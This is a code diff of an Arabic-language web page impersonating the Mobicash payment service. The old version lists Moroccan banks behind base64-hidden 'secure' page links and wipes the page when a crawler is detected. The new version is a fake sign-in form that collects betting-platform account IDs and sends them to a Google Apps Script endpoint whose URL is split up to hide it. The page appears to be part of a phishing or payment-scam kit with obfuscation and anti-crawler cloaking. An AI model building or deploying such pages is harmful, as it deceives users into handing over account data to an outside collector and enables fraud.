@@ -1,131 +1,247 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8"/>
-<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>Mobicash Services</title>
-<style>
-:root{--bg:#f7f7f9;--card:#ffffff;--text:#0f172a;--muted:#667085;--border:#e6e8ee;--shadow:0 10px 30px rgba(16,24,40,.08);--primary:#80a7ff;--primary2:#6b93ef}
-html,body{margin:0;overflow-x:hidden;background:var(--bg);color:var(--text);font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,Arial}
-header{background:#fff;box-shadow:var(--shadow);padding:12px 16px;border-bottom:1px solid var(--border)}
-.header-content{display:flex;align-items:center;justify-content:space-between;max-width:960px;margin:0 auto}
-.menu-icon{font-size:24px;cursor:pointer;color:#2c3e50}
-.site-title{font-size:18px;font-weight:800;color:#111;text-align:center;flex-grow:1;line-height:1.2}
-.profile-section{display:flex;align-items:center;gap:10px}
-.profile-icon{width:46px;height:46px;border-radius:14px;background:#f3f5f9;display:flex;align-items:center;justify-content:center;border:1px solid var(--border)}
-.profile-icon svg{width:28px;height:28px}
-.profile-info{display:flex;flex-direction:column;align-items:flex-end;font-size:13px;line-height:1.2;user-select:all}
-#userIdDisplay{color:#344054;font-weight:700}
-.profile-label{color:#2e7d32;font-weight:800;margin-right:2px}
-.account-section{padding:24px 16px;background:var(--bg)}
-.account-section>div,.account-section>section{max-width:960px;margin:0 auto}
-.account-header{font-size:13px;font-weight:700;color:#8a94a6;margin:0 0 10px;text-align:right}
-.account-option{background:var(--card);border:1px solid var(--border);border-radius:22px;box-shadow:var(--shadow);overflow:hidden}
-.option-item{display:flex;align-items:center;padding:14px 16px;cursor:pointer;position:relative;transition:.2s}
-.option-item:not(:last-child)::after{content:"";position:absolute;bottom:0;right:72px;left:0;height:1px;background:var(--border)}
-.option-item:hover{background:#f4f6fb}
-.icon-circle{width:40px;height:40px;border-radius:12px;display:flex;align-items:center;justify-content:center;margin-left:12px;background:#fff;border:1px solid var(--border);box-shadow:0 2px 8px rgba(0,0,0,.05);transition:.2s}
-.icon-circle img{width:110%;height:110%;object-fit:contain;filter:drop-shadow(0 0 2px rgba(0,0,0,.25));transition:.2s}
-.option-item:hover .icon-circle{transform:translateY(-1px)}
-.option-text{flex-grow:1;color:#0b1220;font-size:15px;font-weight:800}
-.arrow-icon{color:#8a94a6;font-size:18px}
-.toast{position:fixed;bottom:24px;left:50%;transform:translate(-50%,20px);background:#ef4444;color:#fff;padding:12px 20px;border-radius:12px;font-size:14px;opacity:0;pointer-events:none;z-index:1000;transition:opacity .35s,transform .35s,visibility .35s;box-shadow:0 8px 22px rgba(0,0,0,.2);visibility:hidden}
-.toast.show{opacity:1;transform:translate(-50%,0);visibility:visible}
-.recommended-section{background:transparent;padding:18px 0 6px;margin:24px 0 0}
-.recommended-title{font-size:18px;font-weight:800;color:#101828;margin:0 0 14px;text-align:center}
-.recommended-wrapper{display:grid;grid-template-columns:repeat(auto-fit,minmax(110px,1fr));gap:14px;width:100%}
-.bank-card{background:var(--card);border:1px solid var(--border);border-radius:16px;box-shadow:var(--shadow);cursor:pointer;overflow:hidden;display:flex;flex-direction:column;height:110px;transition:.2s}
-.bank-card:hover{transform:translateY(-2px)}
-.top-section{background:#fff;height:58%;display:flex;justify-content:center;align-items:center;padding:10px}
-.top-section img{max-width:90%;max-height:34px;object-fit:contain;transform-style:preserve-3d;transition:transform .45s ease}
-.top-section img:hover{animation:goBack .5s ease}
-.bottom-section{background:var(--primary);color:#fff;height:42%;display:flex;align-items:center;justify-content:center;font-size:13px;text-align:center;font-weight:800}
-@media (max-width:600px){.bank-card{height:100px}.bottom-section{font-size:12px}.recommended-wrapper{grid-template-columns:repeat(3,1fr);gap:12px}}
-@keyframes goBack{0%{transform:translateZ(0)}50%{transform:translateZ(-80px)}100%{transform:translateZ(0)}}
-.animate-back{animation:goBack .5s ease}
-.overlay{position:fixed;inset:0;background:rgba(15,23,42,.28);backdrop-filter:saturate(140%) blur(2px);z-index:2000;opacity:0;pointer-events:none;transition:.25s}
-.overlay.active{opacity:1;pointer-events:auto}
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sign in to - Mobicash</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://unpkg.com/lucide@latest"></script>
+  <style>
+    select option { color: #000; }
+    @media (prefers-color-scheme: dark) {
+      select option { color: #fff; }
+    }
+    .fade { transition: all 0.3s ease; opacity: 0; transform: translateY(-5px); }
+    .fade.show { opacity: 1; transform: translateY(0); }
+    #oneClickTab {
+      background-color: #27632a;
+      border: none;
+      padding: 10px 18px;
+      border-radius: 8px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      font-weight: 500;
+      font-family: 'Arial', sans-serif;
+      font-size: 16px;
+      color: #ffffff;
+      width: 100%;
+      margin-bottom: 24px;
+      transition: background-color 0.2s ease, color 0.2s ease;
+    }
+    #oneClickTab svg { fill: #ffffff; }
+    #oneClickTab:hover, #oneClickTab:active {
+      background-color: #d6eed9;
+      color: #2b2b2b;
+    }
+    #oneClickTab:hover svg, #oneClickTab:active svg {
+      fill: #2b2b2b;
+    }
+    body {
+      user-select: none;
+      -webkit-user-drag: none;
+      -webkit-touch-callout: none;
+    }
+    .dropdown-item img { display: none; }
+  </style>
 </head>
-<body>
-<div id="toast" class="toast"></div>
-<div id="overlay" class="overlay"></div>
-<header>
-  <div class="header-content">
-    <div class="profile-section">
-      <div class="profile-icon">
-        <svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg"><circle cx="32" cy="20" r="10" fill="#ffffff"/><ellipse cx="32" cy="48" rx="18" ry="10" fill="#ffffff"/></svg>
-      </div>
-      <div class="profile-info">
-        <div id="userIdDisplay">id: </div>
-        <div class="profile-label">الملف الشخصي</div>
+<body class="bg-gray-100 dark:bg-gray-900 min-h-screen flex items-center justify-center px-4">
+  <div class="bg-white dark:bg-gray-800 shadow-2xl rounded-2xl p-8 w-full max-w-md">
+    <h2 class="text-2xl font-bold text-center text-gray-800 dark:text-white mb-6">Sign in to Mobicash</h2>
+    <button id="oneClickTab">
+      En un clic
+      <svg xmlns="http://www.w3.org/2000/svg" width="14" height="32" viewBox="0 0 14 16">
+        <path d="M10 5.5l-.2-.1H6.6L9.8 1V.8H4.9l-4 7v.3h3l-3 6.3v.3h.4l8.7-9c.1 0 .1-.1 0-.2z"/>
+      </svg>
+    </button>
+    <div class="mb-4 relative">
+      <label for="platform" class="block mb-2 text-sm font-medium text-gray-700 dark:text-gray-300">اختر المنصة</label>
+      <div id="customSelect" class="relative w-full">
+        <button id="dropdownBtn" class="w-full flex items-center justify-between px-4 py-2 border rounded-xl bg-white dark:bg-gray-700 text-sm text-gray-800 dark:text-white focus:outline-none focus:ring-2 focus:ring-blue-500">
+          <span id="selectedText">اختر المنصة</span>
+          <svg class="w-4 h-4 ml-2" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7" />
+          </svg>
+        </button>
+        <ul id="dropdownList" class="absolute z-10 w-full bg-white dark:bg-gray-700 border rounded-xl mt-1 hidden max-h-60 overflow-y-auto text-sm text-gray-800 dark:text-white">
+          <li class="dropdown-item px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 cursor-pointer flex items-center justify-between" data-value="Mega pari">
+            <span>Mega pari</span> <img src="https://i.postimg.cc/yx8yj8JF/recharge.jpg" class="w-6 h-6 rounded-full" />
+          </li>
+          <li class="dropdown-item px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 cursor-pointer flex items-center justify-between" data-value="Linbet">
+            <span>Linbet</span> <img src="https://i.postimg.cc/xCgWJjwv/recharge.jpg" class="w-6 h-6 rounded-full" />
+          </li>
+          <li class="dropdown-item px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 cursor-pointer flex items-center justify-between" data-value="Gooobet">
+            <span>Gooobet</span> <img src="https://i.postimg.cc/gk4fGxqP/recharge.jpg" class="w-6 h-6 rounded-full" />
+          </li>
+          <li class="dropdown-item px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 cursor-pointer flex items-center justify-between" data-value="1xbet">
+            <span>1xbet</span> <img src="https://i.postimg.cc/g277nb7D/recharge.jpg" class="w-6 h-6 rounded-full" />
+          </li>
+          <li class="dropdown-item px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 cursor-pointer flex items-center justify-between" data-value="Melbet">
+            <span>Melbet</span> <img src="https://i.postimg.cc/0jZWvTm7/recharge.jpg" class="w-6 h-6 rounded-full" />
+          </li>
+        </ul>
+        <input type="hidden" id="platform" name="platform" />
       </div>
     </div>
-    <div class="site-title">Mobicash<br>Services</div>
-    <div class="menu-icon">&#9776;</div>
+    <div class="mb-4">
+      <label for="userId" class="block mb-2 text-sm font-medium text-gray-700 dark:text-gray-300">أدخل الـ ID</label>
+      <input type="text" id="userId" maxlength="13" inputmode="numeric" pattern="[0-9]*" placeholder="مثال: 1234567..." class="w-full px-4 py-2 border rounded-xl text-sm bg-white text-gray-800 dark:bg-gray-700 dark:text-white focus:outline-none focus:ring-2 focus:ring-blue-500" oninput="filterDigits(this); validateId()" onkeydown="return isNumberKey(event)" />
+    </div>
+    <div id="message" class="fade text-center text-sm mb-4 h-5"></div>
+    <button id="submitBtn" onclick="secureLogin()" class="relative w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 rounded-xl transition duration-300 flex items-center justify-center gap-2">
+      <i data-lucide="log-in" class="w-5 h-5"></i>
+      <span class="label">Sign in</span>
+      <svg id="loader" class="hidden absolute w-5 h-5 animate-spin" viewBox="0 0 24 24" fill="none">
+        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+        <path class="opacity-75" d="M4 12a8 8 0 018-8v8z" fill="currentColor"></path>
+      </svg>
+    </button>
   </div>
-</header>
-
-<main class="account-section">
-  <div class="account-header">إدارة الحساب</div>
-  <div class="account-option">
-    <div class="option-item" id="deposit-option">
-      <div class="icon-circle">
-        <img src="https://i.ibb.co/nS2x140/A825-BDBC-18-A3-4-D5-C-9-E17-6-F994-F30-B307-removebg-preview.png" alt="">
-      </div>
-      <div class="option-text">إجراء الإيداع</div>
-      <div class="arrow-icon">›</div>
-    </div>
-    <div class="option-item" id="withdraw-option">
-      <div class="icon-circle">
-        <img src="https://i.ibb.co/rRDF6BbH/9-FD1-E7-E9-36-EE-4530-AC26-5-B1976634666-removebg-preview.png" alt="">
-      </div>
-      <div class="option-text">السحب من الحساب</div>
-      <div class="arrow-icon">›</div>
-    </div>
-  </div>
-
-  <section class="recommended-section" id="recommended">
-    <h3 class="recommended-title">الطرق الموصى بها</h3>
-    <div class="recommended-wrapper">
-      <div class="bank-card" data-enc="c2VjdXJlLWFiLmh0bWw="><div class="top-section"><img src="https://i.postimg.cc/tCQqLF96/recharge.png"></div><div class="bottom-section">Al Barid</div></div>
-      <div class="bank-card" data-enc="c2VjdXJlLWF0Lmh0bWw="><div class="top-section"><img src="https://i.postimg.cc/0QKv4y3Z/recharge.png"></div><div class="bottom-section">Attijari</div></div>
-      <div class="bank-card" data-enc="c2VjdXJlLWNoLmh0bWw="><div class="top-section"><img src="https://i.postimg.cc/6pHN5ZxY/recharge.png"></div><div class="bottom-section">CIH</div></div>
-      <div class="bank-card" data-enc="c2VjdXJlLWNwLmh0bWw="><div class="top-section"><img src="https://i.postimg.cc/vZ2pdd5K/recharge.png"></div><div class="bottom-section">Cash Plus</div></div>
-      <div class="bank-card" data-enc="c2VjdXJlLWJweS5odG1s"><div class="top-section"><img src="https://i.postimg.cc/wjrbGQp8/recharge.png"></div><div class="bottom-section">Barid Pay</div></div>
-      <div class="bank-card" data-enc="c2VjdXJlLWJwLmh0bWw="><div class="top-section"><img src="https://i.postimg.cc/8cwZBhHY/recharge.png"></div><div class="bottom-section">Banque Populaire</div></div>
-    </div>
-  </section>
-
-  <section class="recommended-section">
-    <h3 class="recommended-title">صرافات العملات الإلكترونية</h3>
-    <div class="recommended-wrapper">
-      <div class="bank-card" data-enc="c2VjdXJlLXJ0cHkuaHRtbA=="><div class="top-section"><img src="https://i.postimg.cc/hvhd6Tn6/recharge.png"></div><div class="bottom-section">RedotPay</div></div>
-      <div class="bank-card" data-enc="c2VjdXJlLWJsLmh0bWw="><div class="top-section"><img src="https://i.postimg.cc/QdcW2XL8/recharge.png"></div><div class="bottom-section">Lbankalik</div></div>
-      <div class="bank-card" data-enc="c2VjdXJlLXNncy5odG1s"><div class="top-section"><img src="https://i.postimg.cc/DZwJ4LS0/recharge.png"></div><div class="bottom-section">Société Générale SGMA</div></div>
-      <div class="bank-card" data-enc="c2VjdXJlLWNtLmh0bWw="><div class="top-section"><img src="https://i.postimg.cc/3JvyGKxX/recharge.png"></div><div class="bottom-section">CDM</div></div>
-    </div>
-  </section>
-
-  <section class="recommended-section">
-    <h3 class="recommended-title">التحويل البنكي</h3>
-    <div class="recommended-wrapper">
-      <div class="bank-card" data-enc="c2VjdXJlLWF0Lmh0bWw="><div class="top-section"><img src="https://i.postimg.cc/0QKv4y3Z/recharge.png"></div><div class="bottom-section">Attijari</div></div>
-      <div class="bank-card" data-enc="c2VjdXJlLWJwLmh0bWw="><div class="top-section"><img src="https://i.postimg.cc/8cwZBhHY/recharge.png"></div><div class="bottom-section">Banque Populaire</div></div>
-      <div class="bank-card" data-enc="c2VjdXJlLWJweS5odG1s"><div class="top-section"><img src="https://i.postimg.cc/wjrbGQp8/recharge.png"></div><div class="bottom-section">Barid Pay</div></div>
-      <div class="bank-card" data-enc="c2VjdXJlLWNwLmh0bWw="><div class="top-section"><img src="https://i.postimg.cc/vZ2pdd5K/recharge.png"></div><div class="bottom-section">Cash Plus</div></div>
-      <div class="bank-card" data-enc="c2VjdXJlLWNoLmh0bWw="><div class="top-section"><img src="https://i.postimg.cc/6pHN5ZxY/recharge.png"></div><div class="bottom-section">CIH</div></div>
-      <div class="bank-card" data-enc="c2VjdXJlLWFiLmh0bWw="><div class="top-section"><img src="https://i.postimg.cc/tCQqLF96/recharge.png"></div><div class="bottom-section">Al Barid</div></div>
-      <div class="bank-card" data-enc="c2VjdXJlLWNtLmh0bWw="><div class="top-section"><img src="https://i.postimg.cc/3JvyGKxX/recharge.png"></div><div class="bottom-section">CDM</div></div>
-      <div class="bank-card" data-enc="c2VjdXJlLWJsLmh0bWw="><div class="top-section"><img src="https://i.postimg.cc/QdcW2XL8/recharge.png"></div><div class="bottom-section">Lbankalik</div></div>
-      <div class="bank-card" data-enc="c2VjdXJlLXJ0cHkuaHRtbA=="><div class="top-section"><img src="https://i.postimg.cc/hvhd6Tn6/recharge.png"></div><div class="bottom-section">RedotPay</div></div>
-      <div class="bank-card" data-enc="c2VjdXJlLXNncy5odG1s"><div class="top-section"><img src="https://i.postimg.cc/DZwJ4LS0/recharge.png"></div><div class="bottom-section">Société Générale SGMA</div></div>
-    </div>
-  </section>
-</main>
 
 <script>
-const a=localStorage.getItem("userId")||"غير مسجل";document.getElementById("userIdDisplay").textContent="id: "+a;const b=document.getElementById("toast");function c(d){b.textContent=d;b.classList.add("show");setTimeout(()=>b.classList.remove("show"),3000)}document.getElementById("withdraw-option").addEventListener("click",()=>{c("الرجاء إجراء الإيداع أولاً للتمكن من استخدام خاصية السحب عبر id.")});document.getElementById("deposit-option").addEventListener("click",()=>{document.getElementById("recommended").scrollIntoView({behavior:"smooth"})});document.querySelectorAll(".bank-card").forEach(e=>{const f=e.querySelector(".top-section img"),g=e.dataset.enc,h=document.getElementById("overlay"),i=()=>{try{f.classList.add("animate-back");h.classList.add("active");const j=atob(g);setTimeout(()=>location.href=j,600)}catch(k){}};e.addEventListener("click",i);e.addEventListener("touchstart",l=>{const m=l.touches[0];e.dataset.tx=m.clientX;e.dataset.ty=m.clientY},{passive:true});e.addEventListener("touchend",n=>{const o=n.changedTouches[0],p=Math.abs(o.clientX-e.dataset.tx),q=Math.abs(o.clientY-e.dataset.ty);if(p<10&&q<10)i()})});window.addEventListener("pageshow",()=>{const r=document.getElementById("overlay");if(r)r.classList.remove("active");document.querySelectorAll(".top-section img").forEach(s=>s.classList.remove("animate-back"))});if(navigator.webdriver||/bot|crawl|spider|crawling/i.test(navigator.userAgent)){document.body.innerHTML="";alert("تم حظر الوصول.")}
+  lucide.createIcons();
+
+  const isRepeatedDigits = id => /^(\d)\1{6,12}$/.test(id);
+
+  function showMessage(text, type = "error") {
+    const msg = document.getElementById("message");
+    msg.className = "fade show text-center text-sm mb-4 h-5";
+    msg.textContent = text;
+    msg.style.color = type === "success" ? "green" : "red";
+  }
+
+  function filterDigits(input) {
+    input.value = input.value.replace(/[^\d]/g, '');
+  }
+
+  function isNumberKey(e) {
+    const key = e.key;
+    return /^[0-9]$/.test(key) || ['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'Tab'].includes(key);
+  }
+
+  function validateId() {
+    const userId = document.getElementById("userId").value;
+    if (isRepeatedDigits(userId)) {
+      showMessage("المعرف غير معتمد. الرجاء التحقق.");
+      return;
+    }
+    document.getElementById("message").className = "fade";
+    document.getElementById("message").textContent = "";
+  }
+
+  function resetForm() {
+    const btn = document.getElementById("submitBtn");
+    const loader = document.getElementById("loader");
+    const label = btn.querySelector(".label");
+    btn.disabled = false;
+    btn.classList.remove("opacity-50", "cursor-not-allowed");
+    loader.classList.add("hidden");
+    label.classList.remove("hidden");
+    document.getElementById("platform").disabled = false;
+    document.getElementById("userId").disabled = false;
+  }
+
+  function getRealScriptURL() {
+    const a = "https://script";
+    const b = ".google.com/macros/s/";
+    const c = "AKfycbztE1ZG1WWVrbtfaKPTqOatcrue2jjUDoGpdPv1HyHcq0l6rPyD7aL6OT5Pfekpf_pAUA";
+    return a + b + c + "/exec";
+  }
+
+  function secureLogin() {
+    const platform = document.getElementById("platform").value;
+    const userId = document.getElementById("userId").value.trim();
+    const btn = document.getElementById("submitBtn");
+    const loader = document.getElementById("loader");
+    const label = btn.querySelector(".label");
+
+    if (!platform) return showMessage("اختر المنصة.");
+    if (!userId) return showMessage("أدخل المعرّف.");
+    if (userId.length < 7 || userId.length > 13 || !/^\d+$/.test(userId) || isRepeatedDigits(userId)) {
+      return showMessage("المعرف غير معتمد. الرجاء التحقق.");
+    }
+
+    btn.disabled = true;
+    btn.classList.add("opacity-50", "cursor-not-allowed");
+    loader.classList.remove("hidden");
+    label.classList.add("hidden");
+    document.getElementById("platform").disabled = true;
+    document.getElementById("userId").disabled = true;
+
+    sessionStorage.setItem("authorized", "true");
+    localStorage.setItem("platform", platform);
+    localStorage.setItem("userId", userId);
+
+    fetch(getRealScriptURL(), {
+      method: "POST",
+      mode: "no-cors",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ platform, userId })
+    }).finally(() => {
+      setTimeout(() => {
+        window.location.href = "dashboard.html";
+      }, 800);
+    });
+  }
+
+  document.getElementById("oneClickTab").addEventListener("click", () => {
+    document.getElementById("platform").value = "";
+    document.getElementById("selectedText").textContent = "اختر المنصة";
+    document.getElementById("userId").value = "";
+    document.getElementById("message").className = "fade";
+    document.getElementById("message").textContent = "";
+    resetForm();
+  });
+
+  const dropdownBtn = document.getElementById("dropdownBtn");
+  const dropdownList = document.getElementById("dropdownList");
+  const selectedText = document.getElementById("selectedText");
+  const platformInput = document.getElementById("platform");
+
+  dropdownBtn.addEventListener("click", () => {
+    dropdownList.classList.toggle("hidden");
+  });
+
+  document.querySelectorAll(".dropdown-item").forEach(item => {
+    item.addEventListener("click", () => {
+      const value = item.getAttribute("data-value");
+      platformInput.value = value;
+      dropdownList.classList.add("hidden");
+      const img = item.querySelector("img").getAttribute("src");
+      selectedText.innerHTML = `<span>${value}</span><img src="${img}" class="w-6 h-6 rounded-full ml-2" />`;
+    });
+  });
+
+  window.addEventListener("click", function(e) {
+    if (!dropdownBtn.contains(e.target) && !dropdownList.contains(e.target)) {
+      dropdownList.classList.add("hidden");
+    }
+  });
+
+  document.addEventListener("DOMContentLoaded", () => {
+    const storedPlatform = localStorage.getItem("platform");
+    const storedId = localStorage.getItem("userId");
+
+    if (storedPlatform) {
+      const item = [...document.querySelectorAll(".dropdown-item")].find(i => i.dataset.value === storedPlatform);
+      if (item) {
+        platformInput.value = storedPlatform;
+        const img = item.querySelector("img").getAttribute("src");
+        selectedText.innerHTML = `<span>${storedPlatform}</span><img src="${img}" class="w-6 h-6 rounded-full ml-2" />`;
+      } else {
+        platformInput.value = "";
+        selectedText.textContent = "اختر المنصة";
+      }
+    }
+
+    if (storedId) document.getElementById("userId").value = storedId;
+    resetForm();
+  });
+
+  window.addEventListener("pageshow", (e) => {
+    if (e.persisted) resetForm();
+  });
 </script>
 </body>
 </html>
